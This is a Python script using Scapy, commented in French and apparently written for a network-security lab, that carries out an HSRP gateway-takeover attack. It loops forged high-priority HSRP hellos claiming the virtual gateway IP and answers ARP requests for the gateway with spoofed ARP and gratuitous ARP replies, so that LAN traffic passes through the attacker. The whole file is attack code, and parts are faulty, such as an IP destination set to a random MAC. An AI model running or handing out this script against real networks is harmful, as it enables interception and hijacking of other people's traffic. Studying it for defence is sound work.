#!/usr/bin/python3
'''Code source pour l'attaque HSRP'''
#Importation de toutes les fonctionnalités de la bibliothèque scapy
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, UDP
from scapy.layers.hsrp import HSRP

#Définition des différentes varaibles dont nous allons avoir besoin
#L'interface connectée au réseau local envoyant des paquets
interface = "eth0"
#Adresse IP de l'hôte utilisé comme passerelle - à choisir !
ip = "192.168.57.10"
#Adresse IP de la passerelle HSRP
gateway_ip = "192.168.57.1"
#Adresse MAC de la passerelle HSRP
gateway_mac = "00:00:0c:07:ac:0a"

#Création d'une trame HSRP avec Scapy
def frame_hsrp():
    frame_l1 = Ether(src=gateway_mac)
    frame_l2 = IP(src=ip, dst=RandMAC())
    frame_l3 = UDP()
    hsrp = HSRP(group=10, priority=111, virtualIP=gateway_ip)
    final_frame_hsrp = frame_l1 / frame_l2 / frame_l3 / hsrp
    sendp(final_frame_hsrp, iface=interface, inter=2, loop=1)

#Utilisation de Scapy afin d'écouter le trafic ARP
def Sniff():
    #Nouvelle fonction appelée à chaque paquet ARP capturé sur le trafic
    def arp(frame):
        #Vérification du paquet si c'est oui ou non une requête ARP, destinée à la passerelle spécifiée précédemment "gateway_ip"
        if ARP in frame and frame[ARP].op is 1 and frame[ARP].pdst == gateway_ip:
            #Envoie une réponse ARP (op=2) afin d'indiquer l'adresse MAC de la passerelle spécifiée précédemment "gateway_mac"
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff", src=gateway_mac, type=0x806) /
                  ARP(op=2, hwsrc=gateway_mac, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, pdst=gateway_ip) /
                  Padding(load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'),
                  iface=interface)
            #Envoie un paquet ARP gratuit (Gratuitous ARP) pour annoncer l'adresse MAC de la passerelle au réseau
            sendp(Ether(dst="01:00:0c:cd:cd:cd", src=gateway_mac, type=0x806) /
                  ARP(op=2, hwsrc=gateway_mac, hwdst="01:00:0c:cd:cd:cd", psrc=gateway_ip, pdst=gateway_ip) /
                  Padding(load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'),
                  iface=interface)
    #Utilisation de la fonction "sniff" de Scapy afin de capturer le trafic ARP sur l'interface spécifiée précédemment (interface)
    #La fonction arp est appelée pour chaque paquet ARP capturé
    #Appel de la fonction "sniff" pour lancer la capture ARP
    sniff(prn=arp, filter="arp", store=0, iface=interface)



